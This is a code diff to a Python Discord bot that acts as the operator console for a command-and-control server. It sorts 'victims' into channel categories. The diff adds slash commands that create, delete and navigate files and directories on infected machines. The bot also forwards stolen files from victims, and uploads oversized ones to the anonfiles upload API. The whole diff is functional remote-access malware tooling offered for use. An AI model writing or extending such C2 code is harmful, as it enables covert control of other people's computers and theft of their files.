@@ -25,6 +25,7 @@ class Utils:
         messages = []
         main_message = "```"
 
+        ic(type(json.loads(ls_data)))
         for name, entry in json.loads(ls_data).items():
             entry_str = f"\n{name} -> {entry['fullpath']}\n"
 
@@ -191,9 +192,10 @@ class BOT:
 
         @bot.event
         async def on_ready():  # start the bot and make categories for the victims
-            ic("BOT UP AND RUNNING")
             synced = await bot.tree.sync()
             ic(f"Synced: {synced}")
+            ic("BOT UP AND RUNNING")
+
             self.makecatgs.start()
             self.check_for_responses.start()
 
@@ -365,9 +367,129 @@ class BOT:
                     data=f"{self.red_circle} Something went wrong:{e}",
                 )[0]
                 await interaction.response.send_message(embed=embed)
+        #!----------------------------------------------------------------
+            
+        @bot.tree.command(name="back")
+        @app_commands.describe()
+        async def ls(interaction: discord.Interaction):
+            try:
+                target = str(interaction.channel.category.name).split("__")[0].lower()
+                r = self.Utils._new_command(command="back", target=target, parameter=None)
+                await interaction.response.send_message(
+                    embed=self.Utils.make_embeds(
+                        title="Response",
+                        description=" ",
+                        data={"Status": str(r.status_code), "response": r.text},
+                    )[0]
+                )
+            except Exception as e:
+                ic(e)
+                embed = self.Utils.make_embeds(
+                    title="C2",
+                    description="C2 Server Response",
+                    data=f"{self.red_circle} Something went wrong:{e}",
+                )[0]
+                await interaction.response.send_message(embed=embed)
+        #!----------------------------------------------------------------
+
+        @bot.tree.command(name="makfile")
+        @app_commands.describe(file_name="the file name with the .ext EX(Test.txt)")
+        async def mk_file(interaction: discord.Interaction,file_name:str):
+            try:
+                target = str(interaction.channel.category.name).split("__")[0].lower()
+                r = self.Utils._new_command(command="mkfile", target=target, parameter=file_name)
+                await interaction.response.send_message(
+                    embed=self.Utils.make_embeds(
+                        title="Response",
+                        description=" ",
+                        data={"Status": str(r.status_code), "response": r.text},
+                    )[0]
+                )
+            except Exception as e:
+                ic(e)
+                embed = self.Utils.make_embeds(
+                    title="C2",
+                    description="C2 Server Response",
+                    data=f"{self.red_circle} Something went wrong:{e}",
+                )[0]
+                await interaction.response.send_message(embed=embed)
 
         #!----------------------------------------------------------------
 
+        @bot.tree.command(name="mkdir")
+        @app_commands.describe(dir_name="the dir name EX(Docs)")
+        async def mk_dir(interaction: discord.Interaction,dir_name:str):
+            try:
+                target = str(interaction.channel.category.name).split("__")[0].lower()
+                r = self.Utils._new_command(command="mkdir", target=target, parameter=dir_name)
+                await interaction.response.send_message(
+                    embed=self.Utils.make_embeds(
+                        title="Response",
+                        description=" ",
+                        data={"Status": str(r.status_code), "response": r.text},
+                    )[0]
+                )
+            except Exception as e:
+                ic(e)
+                embed = self.Utils.make_embeds(
+                    title="C2",
+                    description="C2 Server Response",
+                    data=f"{self.red_circle} Something went wrong:{e}",
+                )[0]
+                await interaction.response.send_message(embed=embed)
+
+
+        #!----------------------------------------------------------------
+        
+        @bot.tree.command(name="rmdir")
+        @app_commands.describe(dir_name="the dir name EX(Docs)")
+        async def rm_dir(interaction: discord.Interaction,dir_name:str):
+            try:
+                target = str(interaction.channel.category.name).split("__")[0].lower()
+                r = self.Utils._new_command(command="deldir", target=target, parameter=dir_name)
+                await interaction.response.send_message(
+                    embed=self.Utils.make_embeds(
+                        title="Response",
+                        description=" ",
+                        data={"Status": str(r.status_code), "response": r.text},
+                    )[0]
+                )
+            except Exception as e:
+                ic(e)
+                embed = self.Utils.make_embeds(
+                    title="C2",
+                    description="C2 Server Response",
+                    data=f"{self.red_circle} Something went wrong:{e}",
+                )[0]
+                await interaction.response.send_message(embed=embed)
+
+        #!----------------------------------------------------------------
+        @bot.tree.command(name="rmfile")
+        @app_commands.describe(file_name="the file name EX(test.txt)")
+        async def rm_file(interaction: discord.Interaction,file_name:str):
+            try:
+                target = str(interaction.channel.category.name).split("__")[0].lower()
+                r = self.Utils._new_command(command="delfile", target=target, parameter=file_name)
+                await interaction.response.send_message(
+                    embed=self.Utils.make_embeds(
+                        title="Response",
+                        description=" ",
+                        data={"Status": str(r.status_code), "response": r.text},
+                    )[0]
+                )
+            except Exception as e:
+                ic(e)
+                embed = self.Utils.make_embeds(
+                    title="C2",
+                    description="C2 Server Response",
+                    data=f"{self.red_circle} Something went wrong:{e}",
+                )[0]
+                await interaction.response.send_message(embed=embed)
+
+        #!----------------------------------------------------------------
+
+    
+    #!----------------------------------------------------------------
     @tasks.loop(seconds=10)
     async def makecatgs(self):
         clients = self.db._return_all_uuids()  # *get all clients in a list[tuple[int]]
@@ -398,16 +520,17 @@ class BOT:
 
     #!----------------------------------------------------------------
     @tasks.loop(seconds=2)
-    async def check_for_responses(self, time=30):
+    async def check_for_responses(self, time=100000):
         ic("Checking")
         for category in self.bot.get_guild(self.guild_id).categories:
             try:
                 Channels = {}
                 uuid = str(category.name).split("__")[1].strip()
-                ic(uuid)
+                #ic(uuid)
                 responses = self.db.get_latest_responses(
                     id=self.db.uuid_to_id(uuid), time=time
                 )  # tuple
+                #ic(responses)
                 if responses != None:
                     for channel in category.text_channels:
                         if channel.name == "responses_text":
@@ -425,88 +548,131 @@ class BOT:
                     else:
                         # try:
                         #ic(responses)
+                        ic(responses[1])
                         if responses[1] == "Text":
-                            response = responses[0]
-                            if response[2] == "ls" or response[2] == "walk":
-                                resp = self.visualize_ls(response[3])
-                                for msg in resp:
-                                    await Channels["file_manager"].send(msg)
+                            try:
+                                response = responses[0]
+                                ic(response[2])
+                                if response[2] == "ls" or response[2] == "walk" or response[2] == "back" or response[2] == "mkfile"or response[2] == "mkdir" or response[2] == "deldir" or response[2] == "delfile":
+                                    ic(response[2])
+                                    ic(response[1])
+                                    ic(response[3])
+                                    try:
+                                        resp = self.Utils.visualize_ls(response[3])
+                                    except Exception as e:
+                                        ic(e)
+                                    ic("GOT RESP")
+                                    ic(resp)
+                                    for msg in resp:
+                                        try:
+                                            ic(Channels["file_manager"].name)
+                                            await Channels["file_manager"].send(msg)
+                                        except Exception as e:
+                                            ic(e)
+                                    try:
+                                        ic(response[1])
+                                        self.db.change_sent_status(status = 1,response_time=response[1],table="response")
+                                    except Exception as e:
+                                        ic(e)
+                                else:
+                                    
+                                    try:
+                                        embeds = self.Utils.make_embeds(
+                                            title=str(response[2]),
+                                            description="Response",
+                                            data=response[3],
+                                        )
+                                    except Exception as e:
+                                        ic(e)
+                                        
+                                    ic(embeds)
+                                    for embed in embeds:
+                                        try:
+                                            await Channels["responses_text"].send(embed=embed)
+                                        except Exception as e:
+                                            ic(e)
 
-                            else:
-                                embeds = self.Utils.make_embeds(
-                                    title=str(response[2]),
-                                    description="Response",
-                                    data=response[3],
-                                )
-                                for embed in embeds:
-                                    await Channels["responses_text"].send(embed=embed)
+                                    self.db.change_sent_status(status = 1,response_time=response[1],table="response")
+                            except Exception as e:
+                                ic(e)
+                                self.db.change_sent_status(status = 1,response_time=response[1],table="response")
 
-                            self.db.change_sent_status(status = 1,response_time=response[1],table="response")
-
+                            
                         elif responses[1] == "File":
-                            response = responses[0]
-                            File = discord.File(response[2], response[1])
-                            if (
-                                response[2].getbuffer().nbytes <= 8_388_608
-                            ):  # Checks if its sendable by embed
-                                embed = self.Utils.make_embeds(
-                                    "FileResponse",
-                                    " ",
-                                    data={
-                                        "Victim": self.db.uuid_to_name(
-                                            self.db.id_to_uuid(response[0])
-                                        ),
-                                        "FileName": response[1],
-                                        "FileSize": self.calculate_size(
-                                            N=response[2].getbuffer().nbytes
-                                        ),
-                                    },
-                                )[0]
-                                await Channels["responses_files"].send(
-                                    embed=embed, file=File
-                                )
-                            else:  # if it isnt going to use the anonfiles api
-                                URL = "https://api.anonfiles.com/upload"
-                                await Channels["responses_files"].send(
-                                    embed=self.Utils.make_embeds(
-                                        title="Downloading",
-                                        description=" ",
+                            try:
+                                response = responses[0]
+                                ic(response[4])
+                                File = discord.File(response[2], response[1])
+                                if (
+                                    response[2].getbuffer().nbytes <= 8_388_608
+                                ):  # Checks if its sendable by embed
+                                    embed = self.Utils.make_embeds(
+                                        "FileResponse",
+                                        " ",
                                         data={
+                                            "Victim": self.db.uuid_to_name(
+                                                self.db.id_to_uuid(response[0])
+                                            ),
                                             "FileName": response[1],
-                                            "FileSize": self.calculate_size(
+                                            "FileSize": self.Utils.calculate_size(
                                                 N=response[2].getbuffer().nbytes
                                             ),
                                         },
                                     )[0]
-                                )
-                                async with aiohttp.ClientSession() as session:
-                                    File = response[2]
-                                    File.name = str(response[1])
-                                    files = {"file": File}
+                                    await Channels["responses_files"].send(
+                                        embed=embed, file=File
+                                    )
+                                    self.db.change_sent_status(status = 1,response_time=response[4],table="files")
 
-                                    async with session.post(
-                                        URL, data=files
-                                    ) as responsee:
-                                        # Handle the response as needed
-                                        r = await responsee.json()
-                                try:
+                                else:  # if it isnt going to use the anonfiles api
+                                    URL = "https://api.anonfiles.com/upload"
                                     await Channels["responses_files"].send(
                                         embed=self.Utils.make_embeds(
-                                            title="File",
-                                            description=response[1],
-                                            data=dict(r),
+                                            title="Downloading",
+                                            description=" ",
+                                            data={
+                                                "FileName": response[1],
+                                                "FileSize": self.Utils.calculate_size(
+                                                    N=response[2].getbuffer().nbytes
+                                                ),
+                                            },
                                         )[0]
                                     )
-                                except Exception as e:
-                                    for embed in self.Utils.make_embeds(
-                                        title="Erorr",
-                                        description="Error",
-                                        data=f"Error occoured: {e}",
-                                    ):
+                                    async with aiohttp.ClientSession() as session:
+                                        File = response[2]
+                                        File.name = str(response[1])
+                                        files = {"file": File}
+
+                                        async with session.post(
+                                            URL, data=files
+                                        ) as responsee:
+                                            # Handle the response as needed
+                                            r = await responsee.json()
+                                    try:
                                         await Channels["responses_files"].send(
-                                            embed=embed
+                                            embed=self.Utils.make_embeds(
+                                                title="File",
+                                                description=response[1],
+                                                data=dict(r),
+                                            )[0]
                                         )
-                            self.db.change_sent_status(status = 1,response_time=response[4],table="files")
+                                        self.db.change_sent_status(status = 1,response_time=response[4],table="files")
+
+                                    except Exception as e:
+                                        for embed in self.Utils.make_embeds(
+                                            title="Erorr",
+                                            description="Error",
+                                            data=f"Error occoured: {e}",
+                                        ):
+                                            await Channels["responses_files"].send(
+                                                embed=embed
+                                            )
+                                        self.db.change_sent_status(status = 1,response_time=response[4],table="files")
+                                    self.db.change_sent_status(status = 1,response_time=response[4],table="files")
+                            except Exception as e:
+                                ic(e)
+                                self.db.change_sent_status(status = 1,response_time=response[4],table="files")
+
 
                     # except Exception as e:
                     #    for embed in self.Utils.make_embeds(title="Erorr",description="Error",data=f"Error occoured: {e}"):
